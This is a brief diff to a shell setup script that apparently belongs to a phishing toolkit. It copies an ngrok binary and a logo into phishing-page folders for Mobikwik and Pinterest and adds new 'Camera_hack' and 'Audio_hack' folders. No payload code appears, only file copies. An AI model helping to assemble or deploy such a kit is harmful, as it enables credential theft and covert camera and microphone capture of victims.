@@ -197,6 +197,12 @@ cp -R ngrok phs/mobikwik/
 cp -R shark_logo phs/mobikwik
 cp -R ngrok phs/pinterest/
 cp -R shark_logo phs/pinterest
+cp -R ngrok phs/Camera_hack
+cp -R shark_logo phs/Camera_hack
+cp -R shark_logo phs/Audio_hack
+cp -R ngrok phs/Audio_hack
+
+
 clear
 echo 
 echo 
